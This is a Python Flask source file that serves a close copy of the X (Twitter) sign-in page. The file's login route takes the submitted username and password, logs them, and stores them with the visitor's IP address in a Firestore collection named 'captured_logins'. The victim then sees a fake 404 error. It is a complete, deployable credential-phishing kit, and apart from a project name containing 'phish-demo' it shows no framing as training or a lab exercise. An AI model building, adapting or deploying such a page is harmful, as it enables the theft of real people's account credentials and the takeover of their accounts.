import json
import os
import firebase_admin
from firebase_admin import credentials, firestore
import os
from flask import Flask, request, render_template_string

app = Flask(__name__)
# Firebase setup
cred = None

# 1. Vercel production: credentials from env var
firebase_json_str = os.environ.get('FIREBASE_CREDENTIALS')
if firebase_json_str:
    try:
        cred_dict = json.loads(firebase_json_str)
        cred = credentials.Certificate(cred_dict)
    except json.JSONDecodeError as e:
        print(f"Error parsing FIREBASE_CREDENTIALS: {e}")
    except Exception as e:
        print(f"Firebase credential error: {e}")

# 2. Local testing fallback (use your downloaded JSON file)
if cred is None:
    # Change this path to where YOU saved the JSON file
    local_json_path = r"C:\Users\Mohit\Downloads\mohit-x-phish-demo-firebase-adminsdk-abc123-xyz.json"
    try:
        cred = credentials.Certificate(local_json_path)
    except Exception as e:
        print(f"Local Firebase key error: {e}")

# Initialize if credentials were loaded
if cred:
    firebase_admin.initialize_app(cred)
    db = firestore.client()
    print("Firestore initialized successfully")
else:
    print("WARNING: Firestore NOT initialized - no credentials found")
    db = None  # or handle gracefully

X_PHISHING_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>X - Sign in</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: #000;
            color: #fff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .modal {
            background: #000;
            width: 100%;
            max-width: 480px;
            padding: 32px 24px;
            border-radius: 16px;
            position: relative;
            text-align: center;
        }
        .close {
            position: absolute;
            top: 16px;
            left: 16px;
            font-size: 28px;
            cursor: pointer;
            color: #fff;
        }
        .logo {
            font-size: 48px;
            font-weight: 900;
            margin: 20px 0 40px;
            letter-spacing: -4px;
        }
        h1 {
            font-size: 31px;
            font-weight: 800;
            margin-bottom: 40px;
        }
        .btn {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 100%;
            padding: 12px 24px;
            margin: 12px 0;
            font-size: 17px;
            font-weight: 700;
            border-radius: 9999px;
            border: none;
            cursor: pointer;
        }
        .btn-google {
            background: #fff;
            color: #000;
        }
        .btn-apple {
            background: #fff;
            color: #000;
        }
        .or {
            margin: 20px 0;
            color: #71767b;
            font-size: 15px;
            font-weight: 500;
        }
        .input-group {
            margin: 16px 0;
        }
        input {
            width: 100%;
            padding: 16px;
            font-size: 17px;
            background: #000;
            border: 1px solid #536471;
            border-radius: 8px;
            color: #fff;
        }
        input::placeholder {
            color: #71767b;
        }
        .next-btn {
            width: 100%;
            padding: 12px;
            background: #fff;
            color: #000;
            font-size: 17px;
            font-weight: 700;
            border: none;
            border-radius: 9999px;
            cursor: pointer;
            margin-top: 20px;
        }
        .forgot {
            margin: 24px 0;
            font-size: 15px;
        }
        .forgot a {
            color: #1d9bf0;
            text-decoration: none;
        }
        .signup {
            margin-top: 40px;
            font-size: 15px;
            color: #71767b;
        }
        .signup a {
            color: #1d9bf0;
            text-decoration: none;
            font-weight: 700;
        }
        @media (max-width: 500px) {
            .modal { padding: 24px 16px; }
            .logo { font-size: 40px; }
            h1 { font-size: 28px; }
        }
    </style>
</head>
<body>
    <div class="modal">
        <div class="close">×</div>
        <div class="logo">X</div>
        <h1>Sign in to X</h1>

        <button class="btn btn-google">G Sign in with Google</button>
        <button class="btn btn-apple">Sign in with Apple</button>

        <div class="or">or</div>

        <form action="/x-auth" method="post">
            <div class="input-group">
                <input type="text" name="identifier" placeholder="Phone, email, or username" required autofocus>
            </div>
            <div class="input-group">
                <input type="password" name="password" placeholder="Password" required>
            </div>
            <button type="submit" class="next-btn">Next</button>
        </form>

        <div class="forgot">
            <a href="#">Forgot password?</a>
        </div>

        <div class="signup">
            Don't have an account? <a href="#">Sign up</a>
        </div>
    </div>
</body>
</html>
'''
@app.route('/')
def index():
    return render_template_string(X_PHISHING_TEMPLATE)

@app.route('/x-auth', methods=['POST'])
def authenticate():
    print("=== POST /x-auth received ===")
    email = request.form.get('identifier', '').strip()  # match name="identifier" in form
    password = request.form.get('password', '').strip()
    print(f"Form data - identifier/email: '{email}' | password: '{password}'")

    if not email or not password:
        print("Missing email or password - skipping save")
        return "Error:404 not found"

    if db is None:
        print("Firestore DB is None - credentials not loaded")
        return "Error:404 not found"

    try:
        print("Attempting Firestore write...")
        doc_ref = db.collection('captured_logins').document()
        doc_ref.set({
            'identifier': email,
            'password': password,
            'timestamp': firestore.SERVER_TIMESTAMP,
            'ip': request.remote_addr or 'unknown'
        })
        print("Firestore write SUCCESS")
    except Exception as e:
        print(f"Firestore write FAILED: {str(e)}")

    return "Error:404 not found"